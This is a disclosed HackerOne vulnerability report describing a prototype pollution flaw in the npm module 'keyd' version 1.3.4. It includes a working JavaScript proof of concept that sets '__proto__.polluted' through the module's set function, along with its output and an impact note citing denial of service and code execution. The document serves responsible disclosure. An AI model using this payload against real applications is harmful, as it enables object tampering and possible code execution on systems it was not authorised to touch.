# [keyd] Prototype pollution

## Report Details
- **Report ID**: 877515
- **URL**: https://hackerone.com/reports/877515
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-05-18T19:58:29.357Z
- **Disclosed**: 2020-09-14T10:51:47.788Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `prototype pollution` vulnerability in `keyd` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `keyd`
**version:** `1.3.4`
**npm page:** `https://www.npmjs.com/package/keyd`

## Module Description

A small library for using and manipulating key paths in JavaScript.

## Module Stats

[71] weekly downloads

# Vulnerability

## Vulnerability Description

The `set` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `keyd` module:
    - `npm i keyd`

Set the `__proto__.polluted` property of an object:
```javascript

const keyd = require('keyd');
const obj = {};
console.log("Before : " + obj.polluted);
keyd({}).set('__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F833532}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Attachments
- keyd_poc.mov
